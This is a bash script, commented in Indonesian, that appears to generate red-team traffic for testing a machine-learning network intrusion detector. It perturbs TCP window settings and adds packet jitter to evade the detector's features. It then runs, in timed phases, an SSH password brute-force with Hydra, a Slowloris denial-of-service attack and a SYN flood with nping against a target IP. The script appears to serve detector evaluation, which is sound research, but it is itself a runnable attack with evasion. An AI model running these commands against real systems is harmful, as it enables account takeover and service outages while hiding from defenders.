#!/bin/bash
# ============================================================
# NIDS01 - EVASION ATTACK SCENARIO (untuk RT-S2 / RT-S4)
# Serangan yang SAMA dengan clean, tapi dengan perturbasi
# fitur jaringan pada level paket untuk mengecoh model:
#   - TCP window size dimodifikasi (target: Init Fwd Win Byts)
#   - Jitter/delay antar-paket via tc netem (target: IAT features)
# Timeline sama dengan attack_clean.sh (7 menit).
# ============================================================
set -u
TARGET_IP="${1:-10.3.2.38}"
IFACE="${2:-ens5}"
PASS_LIST="/opt/attack/passwords.txt"

log() { echo "[$(date +%H:%M:%S)] $*"; }

cleanup_evasion() {
    log "Mengembalikan konfigurasi jaringan ke normal..."
    sudo sysctl -w net.ipv4.tcp_window_scaling=1 >/dev/null 2>&1
    sudo sysctl -w net.ipv4.tcp_rmem="4096 131072 6291456" >/dev/null 2>&1
    sudo tc qdisc del dev "$IFACE" root 2>/dev/null || true
}
trap cleanup_evasion EXIT

log "=== EVASION ATTACK START -> target $TARGET_IP (iface $IFACE) ==="

# --- Aktifkan evasion: modifikasi TCP window + jitter ---
log "Mengaktifkan perturbasi jaringan (TCP window + jitter)"
# Ubah TCP window awal (mempengaruhi Init Fwd Win Byts)
sudo sysctl -w net.ipv4.tcp_window_scaling=0 >/dev/null 2>&1
sudo sysctl -w net.ipv4.tcp_rmem="4096 8192 16384" >/dev/null 2>&1
# Tambah jitter 10ms +/- 5ms (mempengaruhi IAT)
sudo tc qdisc add dev "$IFACE" root netem delay 10ms 5ms 2>/dev/null || \
  sudo tc qdisc change dev "$IFACE" root netem delay 10ms 5ms

# --- Phase 0: Benign warm-up ---
log "Phase 0 (0-1m): Benign warm-up"
end=$((SECONDS+60))
while [ $SECONDS -lt $end ]; do curl -s -m 2 "http://$TARGET_IP/" >/dev/null 2>&1; sleep 1; done

# --- Phase 1: SSH Brute-Force ---
log "Phase 1 (1-3m): SSH Brute-Force (Hydra, evasion aktif)"
timeout 120 hydra -l testuser -P "$PASS_LIST" -t 4 -W 1 "$TARGET_IP" ssh 2>&1 | tail -3

# --- Phase 2: DoS Slowloris ---
log "Phase 2 (3-5m): DoS Slowloris (evasion aktif)"
timeout 120 slowloris "$TARGET_IP" -p 80 -s 150 2>&1 | tail -2

# --- Phase 3: DDoS SYN Flood ---
log "Phase 3 (5-6m): DDoS SYN Flood (evasion aktif)"
sudo timeout 60 nping --tcp --flags SYN --rate 200 -p 80 -c 12000 "$TARGET_IP" 2>&1 | tail -3

# --- Phase 4: Benign cool-down ---
log "Phase 4 (6-7m): Benign cool-down"
end=$((SECONDS+60))
while [ $SECONDS -lt $end ]; do curl -s -m 2 "http://$TARGET_IP/" >/dev/null 2>&1; sleep 1; done

log "=== EVASION ATTACK DONE ==="
# cleanup dipanggil otomatis via trap EXIT
